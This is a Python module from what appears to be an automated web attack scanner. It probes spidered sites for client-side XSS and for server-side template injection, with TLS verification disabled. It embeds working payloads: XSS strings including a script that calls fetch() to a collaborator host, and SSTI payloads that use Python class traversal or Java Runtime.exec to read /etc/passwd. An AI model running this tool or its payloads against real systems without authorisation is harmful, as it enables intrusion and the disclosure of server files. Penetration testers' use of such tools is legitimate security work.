import re
import json
import time
import random
from typing import List, Dict, Optional, Set, Tuple
import urllib.parse
from urllib.parse import urlparse, parse_qs, urljoin

import requests
from bs4 import BeautifulSoup

from . import config
from . import utils
from .payload_engine import PayloadEngine
from .response_analyzer import ResponseAnalyzer


class ClientSideXSSTester:
    def __init__(self, session: requests.Session, timeout=15, delay=0.3, geo_spoof=False, collab_url=None):
        self.session = session
        self.timeout = timeout
        self.delay = delay
        self.geo_spoof = geo_spoof
        self.analyzer = ResponseAnalyzer()
        self.payload_engine = PayloadEngine(collab_url=collab_url)
        self.collab_url = collab_url
        self.results = []
        self.analyzed_endpoints: Set[str] = set()

    def test_all_client_side(self, spider_results: Dict, base_url: str, js_analysis: Dict) -> List[Dict]:
        print("\n=== PHASE 4B: BROWSER-SIDE / CLIENT-SIDE XSS TESTING ===")
        
        self._test_websocket_endpoints(spider_results, base_url)
        self._test_service_worker_sinks(spider_results, base_url)
        self._test_web_worker_sinks(spider_results, base_url)
        self._test_postmessage_sinks(spider_results, base_url, js_analysis)
        self._test_indexeddb_sinks(spider_results, base_url)
        self._test_web_storage_sinks(spider_results, base_url)
        self._test_mutation_xss(spider_results, base_url)
        self._test_prototype_pollution(spider_results, base_url, js_analysis)
        self._test_dom_clobbering(spider_results, base_url)
        self._test_client_side_template_injection(spider_results, base_url, js_analysis)
        self._test_webassembly_sinks(spider_results, base_url)
        self._test_webgpu_webgl_sinks(spider_results, base_url)
        self._test_browser_extension_sinks(spider_results, base_url)
        
        return self.results

    def _test_websocket_endpoints(self, spider_results: Dict, base_url: str):
        print("  Testing WebSocket endpoints for XSS...")
        ws_urls = self._extract_websocket_urls(spider_results)
        
        for ws_url in ws_urls[:5]:
            if ws_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(ws_url)
            
            payloads = self.payload_engine.generate_web_socket_payloads(self.collab_url)
            for payload in payloads[:3]:
                time.sleep(self.delay)
                try:
                    test_url = self._inject_into_ws_url(ws_url, payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "client_side_websocket",
                            "url": ws_url,
                            "method": "GET",
                            "params": ["ws_url"],
                            "payload": payload,
                            "detection_method": f"WebSocket URL reflection: {method}",
                            "confidence": conf,
                            "injection_point": "websocket_endpoint",
                            "sink": "WebSocket",
                        })
                        print(f"    [V] WebSocket XSS: {ws_url}")
                except Exception:
                    pass

    def _extract_websocket_urls(self, spider_results: Dict) -> List[str]:
        ws_urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            for match in re.finditer(r'(ws[s]?://[^\s"\'<>]+)', content, re.IGNORECASE):
                ws_urls.append(match.group(1))
            for match in re.finditer(r'new\s+WebSocket\s*\(\s*["\']([^"\']+)["\']', content):
                ws_urls.append(match.group(1))
        
        for url in spider_results.get("urls", []):
            try:
                resp = self.session.get(url, timeout=5, verify=False)
                for match in re.finditer(r'(ws[s]?://[^\s"\'<>]+)', resp.text, re.IGNORECASE):
                    ws_urls.append(match.group(1))
            except Exception:
                pass
        
        return list(set(ws_urls))

    def _inject_into_ws_url(self, ws_url: str, payload: str) -> str:
        parsed = urlparse(ws_url)
        if parsed.query:
            return ws_url + "&" + urllib.parse.urlencode({"data": payload})
        return ws_url + "?" + urllib.parse.urlencode({"data": payload})

    def _test_service_worker_sinks(self, spider_results: Dict, base_url: str):
        print("  Testing Service Worker sinks...")
        sw_scripts = self._find_service_worker_scripts(spider_results)
        
        for sw_url in sw_scripts[:3]:
            if sw_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sw_url)
            
            payloads = self.payload_engine.generate_service_worker_payloads(self.collab_url)
            for payload in payloads[:2]:
                time.sleep(self.delay)
                try:
                    test_url = sw_url + "?sw_payload=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "client_side_service_worker",
                            "url": sw_url,
                            "method": "GET",
                            "params": ["sw_payload"],
                            "payload": payload,
                            "detection_method": f"Service Worker reflection: {method}",
                            "confidence": conf,
                            "injection_point": "service_worker",
                            "sink": "ServiceWorker.register",
                        })
                        print(f"    [V] Service Worker XSS: {sw_url}")
                except Exception:
                    pass

    def _find_service_worker_scripts(self, spider_results: Dict) -> List[str]:
        sw_urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            if "serviceWorker" in content or "navigator.serviceWorker" in content:
                if script.get("src"):
                    sw_urls.append(script["src"])
        return sw_urls

    def _test_web_worker_sinks(self, spider_results: Dict, base_url: str):
        print("  Testing Web Worker sinks...")
        worker_urls = self._find_web_worker_scripts(spider_results)
        
        for worker_url in worker_urls[:3]:
            if worker_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(worker_url)
            
            payloads = self.payload_engine.generate_web_worker_payloads(self.collab_url)
            for payload in payloads[:2]:
                time.sleep(self.delay)
                try:
                    test_url = worker_url + "?worker_data=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "client_side_web_worker",
                            "url": worker_url,
                            "method": "GET",
                            "params": ["worker_data"],
                            "payload": payload,
                            "detection_method": f"Web Worker reflection: {method}",
                            "confidence": conf,
                            "injection_point": "web_worker",
                            "sink": "Worker.postMessage",
                        })
                        print(f"    [V] Web Worker XSS: {worker_url}")
                except Exception:
                    pass

    def _find_web_worker_scripts(self, spider_results: Dict) -> List[str]:
        worker_urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            if "new Worker(" in content or "Worker(" in content:
                for match in re.finditer(r'new\s+Worker\s*\(\s*["\']([^"\']+)["\']', content):
                    worker_urls.append(match.group(1))
        return worker_urls

    def _test_postmessage_sinks(self, spider_results: Dict, base_url: str, js_analysis: Dict):
        print("  Testing postMessage sinks...")
        pm_sinks = [s for s in js_analysis.get("dom_sinks", []) if s.get("type") == "postmessage_sink"]
        
        if not pm_sinks:
            for script in spider_results.get("scripts", []):
                content = script.get("content", "") or ""
                if "postMessage" in content or "addEventListener.*message" in content:
                    pm_sinks.append({"sink": "postMessage", "file": script.get("src", "inline"), "context": content[:200]})
        
        for sink in pm_sinks[:5]:
            sink_url = sink.get("file", base_url)
            if sink_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sink_url)
            
            payloads = self.payload_engine.generate_postmessage_payloads(self.collab_url)
            for payload in payloads[:3]:
                time.sleep(self.delay)
                try:
                    test_url = sink_url + "#postmsg=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "client_side_postmessage",
                            "url": sink_url,
                            "method": "GET",
                            "params": ["postmsg"],
                            "payload": payload,
                            "detection_method": f"postMessage sink reflection: {method}",
                            "confidence": conf,
                            "injection_point": "postmessage",
                            "sink": "window.postMessage",
                        })
                        print(f"    [V] postMessage XSS: {sink_url}")
                except Exception:
                    pass

    def _test_indexeddb_sinks(self, spider_results: Dict, base_url: str):
        print("  Testing IndexedDB sinks...")
        idb_sinks = self._find_indexeddb_usage(spider_results, base_url)
        
        for sink_url in idb_sinks[:3]:
            if sink_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sink_url)
            
            payloads = self.payload_engine.generate_indexeddb_payloads(self.collab_url)
            for payload in payloads[:2]:
                time.sleep(self.delay)
                try:
                    test_url = sink_url + "#idb=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "client_side_indexeddb",
                            "url": sink_url,
                            "method": "GET",
                            "params": ["idb"],
                            "payload": payload,
                            "detection_method": f"IndexedDB reflection: {method}",
                            "confidence": conf,
                            "injection_point": "indexeddb",
                            "sink": "indexedDB.open/put",
                        })
                        print(f"    [V] IndexedDB XSS: {sink_url}")
                except Exception:
                    pass

    def _find_indexeddb_usage(self, spider_results: Dict, base_url: str) -> List[str]:
        urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            if "indexedDB" in content or "IDB" in content:
                if script.get("src"):
                    urls.append(script["src"])
                else:
                    urls.append(spider_results.get("urls", [base_url])[0])
        return urls

    def _test_web_storage_sinks(self, spider_results: Dict, base_url: str):
        print("  Testing Web Storage (localStorage/sessionStorage) sinks...")
        storage_sinks = self._find_web_storage_usage(spider_results, base_url)
        
        for sink_url in storage_sinks[:5]:
            if sink_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sink_url)
            
            payloads = [
                f"localStorage.setItem('xss','<img src=x onerror=alert(1)>')",
                f"sessionStorage.setItem('xss','<script>fetch(\"{self.collab_url}/storage\")</script>')",
                f"localStorage.xss='<svg onload=alert(1)>'",
            ]
            
            for payload in payloads:
                time.sleep(self.delay)
                try:
                    test_url = sink_url + "#storage=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "client_side_web_storage",
                            "url": sink_url,
                            "method": "GET",
                            "params": ["storage"],
                            "payload": payload,
                            "detection_method": f"Web Storage reflection: {method}",
                            "confidence": conf,
                            "injection_point": "web_storage",
                            "sink": "localStorage/sessionStorage",
                        })
                        print(f"    [V] Web Storage XSS: {sink_url}")
                except Exception:
                    pass

    def _find_web_storage_usage(self, spider_results: Dict, base_url: str) -> List[str]:
        urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            if "localStorage" in content or "sessionStorage" in content:
                if script.get("src"):
                    urls.append(script["src"])
                else:
                    urls.append(spider_results.get("urls", [base_url])[0])
        return list(set(urls))

    def _test_mutation_xss(self, spider_results: Dict, base_url: str):
        print("  Testing Mutation XSS (mutation observer sinks)...")
        mutation_sinks = self._find_mutation_observer_usage(spider_results, base_url)
        
        for sink_url in mutation_sinks[:5]:
            if sink_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sink_url)
            
            payloads = self.payload_engine.generate_mutation_xss_payloads(self.collab_url)
            for payload in payloads[:5]:
                time.sleep(self.delay)
                try:
                    test_url = sink_url + "#mut=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "mutation_xss",
                            "url": sink_url,
                            "method": "GET",
                            "params": ["mut"],
                            "payload": payload,
                            "detection_method": f"Mutation XSS reflection: {method}",
                            "confidence": conf,
                            "injection_point": "mutation_observer",
                            "sink": "MutationObserver",
                        })
                        print(f"    [V] Mutation XSS: {sink_url}")
                except Exception:
                    pass

    def _find_mutation_observer_usage(self, spider_results: Dict, base_url: str) -> List[str]:
        urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            if "MutationObserver" in content:
                if script.get("src"):
                    urls.append(script["src"])
                else:
                    urls.append(spider_results.get("urls", [base_url])[0])
        return list(set(urls))

    def _test_prototype_pollution(self, spider_results: Dict, base_url: str, js_analysis: Dict):
        print("  Testing Prototype Pollution leading to XSS...")
        proto_sinks = self._find_prototype_pollution_sinks(spider_results, base_url, js_analysis)
        
        for sink_url in proto_sinks[:5]:
            if sink_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sink_url)
            
            payloads = self.payload_engine.generate_prototype_pollution_payloads(self.collab_url)
            for payload in payloads[:5]:
                time.sleep(self.delay)
                try:
                    test_url = sink_url + "?__proto__[xss]=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected or "polluted" in resp.text or "xss" in resp.text.lower():
                        self.results.append({
                            "xss_type": "prototype_pollution_xss",
                            "url": sink_url,
                            "method": "GET",
                            "params": ["__proto__[xss]"],
                            "payload": payload,
                            "detection_method": f"Prototype Pollution XSS: {method}",
                            "confidence": conf,
                            "injection_point": "prototype_pollution",
                            "sink": "Object.prototype/__proto__",
                        })
                        print(f"    [V] Prototype Pollution XSS: {sink_url}")
                except Exception:
                    pass

    def _find_prototype_pollution_sinks(self, spider_results: Dict, base_url: str, js_analysis: Dict) -> List[str]:
        urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            if "__proto__" in content or "prototype" in content or "Object.assign" in content or "_.merge" in content or "jQuery.extend" in content:
                if script.get("src"):
                    urls.append(script["src"])
                else:
                    urls.append(spider_results.get("urls", [base_url])[0])
        
        for sink in js_analysis.get("dom_sinks", []):
            if "prototype" in sink.get("context", "").lower() or "__proto__" in sink.get("context", "").lower():
                urls.append(sink.get("file", base_url))
        
        return list(set(urls))

    def _test_dom_clobbering(self, spider_results: Dict, base_url: str):
        print("  Testing DOM Clobbering...")
        clobber_sinks = self._find_dom_clobbering_sinks(spider_results, base_url)
        
        for sink_url in clobber_sinks[:5]:
            if sink_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sink_url)
            
            payloads = [
                '<form id="cookie"><input name="value" value="clobbered"></form>',
                '<img id="config" src="x" onerror="alert(1)">',
                '<a id="location" href="javascript:alert(1)"></a>',
                '<div id="document"><img src=x onerror=alert(1)></div>',
            ]
            
            for payload in payloads:
                time.sleep(self.delay)
                try:
                    test_url = sink_url + "#clobber=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "dom_clobbering",
                            "url": sink_url,
                            "method": "GET",
                            "params": ["clobber"],
                            "payload": payload,
                            "detection_method": f"DOM Clobbering reflection: {method}",
                            "confidence": conf,
                            "injection_point": "dom_clobbering",
                            "sink": "named DOM access",
                        })
                        print(f"    [V] DOM Clobbering XSS: {sink_url}")
                except Exception:
                    pass

    def _find_dom_clobbering_sinks(self, spider_results: Dict, base_url: str) -> List[str]:
        urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            if re.search(r'\b(document|window|location|config|cookie|settings)\b\s*[.=]\s*\w+', content):
                if script.get("src"):
                    urls.append(script["src"])
                else:
                    urls.append(spider_results.get("urls", [base_url])[0])
        return list(set(urls))

    def _test_client_side_template_injection(self, spider_results: Dict, base_url: str, js_analysis: Dict):
        print("  Testing Client-Side Template Injection...")
        template_sinks = self._find_client_template_sinks(spider_results, base_url, js_analysis)
        
        for sink_info in template_sinks[:5]:
            sink_url = sink_info.get("url", base_url)
            template_engine = sink_info.get("engine", "unknown")
            
            if sink_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sink_url)
            
            payloads = self._get_template_payloads(template_engine)
            for payload in payloads[:4]:
                time.sleep(self.delay)
                try:
                    test_url = sink_url + f"?{sink_info.get('param','template')}=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected or "49" in resp.text or "alert" in resp.text.lower():
                        self.results.append({
                            "xss_type": "client_side_template_injection",
                            "url": sink_url,
                            "method": "GET",
                            "params": [sink_info.get('param', 'template')],
                            "payload": payload,
                            "detection_method": f"Client-Side Template Injection ({template_engine}): {method}",
                            "confidence": conf,
                            "injection_point": "template_injection",
                            "sink": template_engine,
                        })
                        print(f"    [V] Client-Side Template Injection ({template_engine}): {sink_url}")
                except Exception:
                    pass

    def _find_client_template_sinks(self, spider_results: Dict, base_url: str, js_analysis: Dict) -> List[Dict]:
        sinks = []
        template_patterns = {
            "handlebars": [r"Handlebars", r"handlebars", r"\{\{.*\}\}"],
            "mustache": [r"Mustache", r"mustache", r"\{\{.*\}\}"],
            "lodash": [r"_.template", r"lodash\.template"],
            "underscore": [r"_.template", r"underscore"],
            "doT": [r"doT\.template", r"doT"],
            "ejs": [r"ejs", r"EJS"],
            "pug": [r"pug", r"jade"],
            "vue": [r"Vue", r"v-html", r"v-bind"],
            "react": [r"dangerouslySetInnerHTML", r"React"],
            "angular": [r"\$sce\.trustAsHtml", r"angular"],
        }
        
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            for engine, patterns in template_patterns.items():
                for pat in patterns:
                    if re.search(pat, content, re.IGNORECASE):
                        sinks.append({
                            "url": script.get("src", spider_results.get("urls", [base_url])[0]),
                            "engine": engine,
                            "param": "template"
                        })
                        break
        
        for url in spider_results.get("urls", [])[:10]:
            try:
                resp = self.session.get(url, timeout=5, verify=False)
                for engine, patterns in template_patterns.items():
                    for pat in patterns:
                        if re.search(pat, resp.text, re.IGNORECASE):
                            sinks.append({"url": url, "engine": engine, "param": "template"})
                            break
            except Exception:
                pass
        
        return sinks

    def _get_template_payloads(self, engine: str) -> List[str]:
        base = [
            "{{constructor.constructor('alert(1)')()}}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "${7*7}",
            "<% alert(1) %>",
            "<script>alert(1)</script>",
        ]
        
        engine_payloads = {
            "handlebars": [
                "{{#with constructor.constructor}}{{alert(1)}}{{/with}}",
                "{{#each constructor.constructor('alert(1)')()}}{{/each}}",
            ],
            "mustache": [
                "{{#with constructor.constructor}}{{alert(1)}}{{/with}}",
            ],
            "lodash": [
                "<%= _.template('alert(1)')() %>",
            ],
            "vue": [
                "{{constructor.constructor('alert(1)')()}}",
                "<img src=x onerror=alert(1)>",
            ],
            "react": [
                "<img src=x onerror=alert(1)>",
                "<script>alert(1)</script>",
            ],
            "angular": [
                "{{constructor.constructor('alert(1)')()}}",
                "{{$eval.constructor('alert(1)')()}}",
            ],
        }
        
        return base + engine_payloads.get(engine.lower(), [])

    def _test_webassembly_sinks(self, spider_results: Dict, base_url: str):
        print("  Testing WebAssembly sinks...")
        wasm_sinks = self._find_wasm_usage(spider_results, base_url)
        
        for sink_url in wasm_sinks[:3]:
            if sink_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sink_url)
            
            payloads = [
                "fetch('/wasm').then(r=>r.arrayBuffer()).then(b=>WebAssembly.instantiate(b)).then(i=>i.instance.exports.main())",
                "new WebAssembly.Memory({initial:1})",
            ]
            
            for payload in payloads:
                time.sleep(self.delay)
                try:
                    test_url = sink_url + "#wasm=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "client_side_wasm",
                            "url": sink_url,
                            "method": "GET",
                            "params": ["wasm"],
                            "payload": payload,
                            "detection_method": f"WebAssembly reflection: {method}",
                            "confidence": conf,
                            "injection_point": "webassembly",
                            "sink": "WebAssembly.instantiate",
                        })
                        print(f"    [V] WebAssembly XSS: {sink_url}")
                except Exception:
                    pass

    def _find_wasm_usage(self, spider_results: Dict, base_url: str) -> List[str]:
        urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            if "WebAssembly" in content or "wasm" in content.lower():
                if script.get("src"):
                    urls.append(script["src"])
                else:
                    urls.append(spider_results.get("urls", [base_url])[0])
        return list(set(urls))

    def _test_webgpu_webgl_sinks(self, spider_results: Dict, base_url: str):
        print("  Testing WebGPU/WebGL sinks...")
        gpu_sinks = self._find_gpu_usage(spider_results, base_url)
        
        for sink_url in gpu_sinks[:3]:
            if sink_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sink_url)
            
            payloads = [
                "navigator.gpu.requestAdapter()",
                "canvas.getContext('webgl')",
                "canvas.getContext('webgl2')",
            ]
            
            for payload in payloads:
                time.sleep(self.delay)
                try:
                    test_url = sink_url + "#gpu=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "client_side_webgpu_webgl",
                            "url": sink_url,
                            "method": "GET",
                            "params": ["gpu"],
                            "payload": payload,
                            "detection_method": f"WebGPU/WebGL reflection: {method}",
                            "confidence": conf,
                            "injection_point": "webgpu_webgl",
                            "sink": "navigator.gpu/canvas.getContext",
                        })
                        print(f"    [V] WebGPU/WebGL XSS: {sink_url}")
                except Exception:
                    pass

    def _find_gpu_usage(self, spider_results: Dict, base_url: str) -> List[str]:
        urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            if "WebGL" in content or "WebGPU" in content or "getContext" in content or "requestAdapter" in content:
                if script.get("src"):
                    urls.append(script["src"])
                else:
                    urls.append(spider_results.get("urls", [base_url])[0])
        return list(set(urls))

    def _test_browser_extension_sinks(self, spider_results: Dict, base_url: str):
        print("  Testing Browser Extension sinks...")
        ext_sinks = self._find_extension_usage(spider_results, base_url)
        
        for sink_url in ext_sinks[:3]:
            if sink_url in self.analyzed_endpoints:
                continue
            self.analyzed_endpoints.add(sink_url)
            
            payloads = [
                "chrome.runtime.sendMessage",
                "browser.runtime.sendMessage",
                "chrome.tabs.executeScript",
            ]
            
            for payload in payloads:
                time.sleep(self.delay)
                try:
                    test_url = sink_url + "#ext=" + urllib.parse.quote(payload)
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    reflected, method, conf = self.analyzer.detect_reflection(payload, resp.text)
                    if reflected:
                        self.results.append({
                            "xss_type": "client_side_extension",
                            "url": sink_url,
                            "method": "GET",
                            "params": ["ext"],
                            "payload": payload,
                            "detection_method": f"Browser Extension reflection: {method}",
                            "confidence": conf,
                            "injection_point": "browser_extension",
                            "sink": "chrome.runtime/browser.runtime",
                        })
                        print(f"    [V] Browser Extension XSS: {sink_url}")
                except Exception:
                    pass

    def _find_extension_usage(self, spider_results: Dict, base_url: str) -> List[str]:
        urls = []
        for script in spider_results.get("scripts", []):
            content = script.get("content", "") or ""
            if "chrome.runtime" in content or "browser.runtime" in content or "chrome.tabs" in content:
                if script.get("src"):
                    urls.append(script["src"])
                else:
                    urls.append(spider_results.get("urls", [base_url])[0])
        return list(set(urls))


class ServerSideTemplateInjectionTester:
    def __init__(self, session: requests.Session, timeout=15, delay=0.5, geo_spoof=False, collab_url=None):
        self.session = session
        self.timeout = timeout
        self.delay = delay
        self.geo_spoof = geo_spoof
        self.analyzer = ResponseAnalyzer()
        self.collab_url = collab_url
        self.results = []

    def test_ssti(self, injection_points: List[Dict]) -> List[Dict]:
        print("\n=== PHASE 3B: SERVER-SIDE TEMPLATE INJECTION (SSTI) ===")
        
        ssti_payloads = self._get_ssti_payloads()
        
        for point in injection_points[:20]:
            url = point.get("url", "")
            method = point.get("method", "GET")
            params = point.get("params", [])
            
            if not params:
                continue
            
            print(f"  Testing SSTI on {method} {url} params: {params}")
            
            for payload in ssti_payloads:
                time.sleep(self.delay)
                try:
                    if method == "GET":
                        test_url = self._build_test_url(url, params, payload)
                        resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                    else:
                        data = {p: payload for p in params}
                        resp = self.session.post(url, data=data, timeout=self.timeout, verify=False)
                    
                    if self._check_ssti_execution(payload, resp.text):
                        self.results.append({
                            "xss_type": "ssti",
                            "url": url,
                            "method": method,
                            "params": params,
                            "payload": payload,
                            "detection_method": f"SSTI - Template engine code execution",
                            "confidence": 0.9,
                            "injection_point": point.get("type", "param"),
                            "sink": "template_engine",
                        })
                        print(f"    [V] SSTI CONFIRMED: {payload[:50]}")
                        break
                        
                except Exception:
                    pass
        
        return self.results

    def _get_ssti_payloads(self) -> List[str]:
        return [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "<% 7*7 %>",
            "{{7*'7'}}",
            "${{7*7}}",
            "@(7*7)",
            "*{7*7}",
            "{{config}}",
            "{{self}}",
            "{{request}}",
            "{{session}}",
            "{{g}}",
            "{{get_flashed_messages()}}",
            "{{lipsum}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{config.__class__.__init__.__globals__}}",
            "{{request.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
            "#{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
            "@{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
            "<%= `cat /etc/passwd` %>",
            "<% `cat /etc/passwd` %>",
            "{{''.getClass().forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd')}}",
            "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd')}",
            "*{''.getClass().forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd')}",
        ]

    def _build_test_url(self, url: str, params: List[str], payload: str) -> str:
        import urllib.parse
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for p in params:
            qs[p] = [payload]
        injected = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
        return injected

    def _check_ssti_execution(self, payload: str, response_text: str) -> bool:
        indicators = [
            "49",
            "root:",
            "/etc/passwd",
            "uid=",
            "gid=",
            "groups=",
            "classloader",
            "subclasses",
            "__mro__",
            "__globals__",
            "java.lang.Runtime",
            "ProcessBuilder",
            "exec(",
            "Runtime.getRuntime",
        ]
        
        response_lower = response_text.lower()
        payload_lower = payload.lower()
        
        if "{{" in payload and "}}" in payload:
            if "49" in response_text and "49" not in payload:
                return True
        
        if "${" in payload and "}" in payload:
            if "49" in response_text and "49" not in payload:
                return True
        
        for indicator in indicators:
            if indicator.lower() in response_lower and indicator.lower() not in payload_lower:
                return True
        
        return False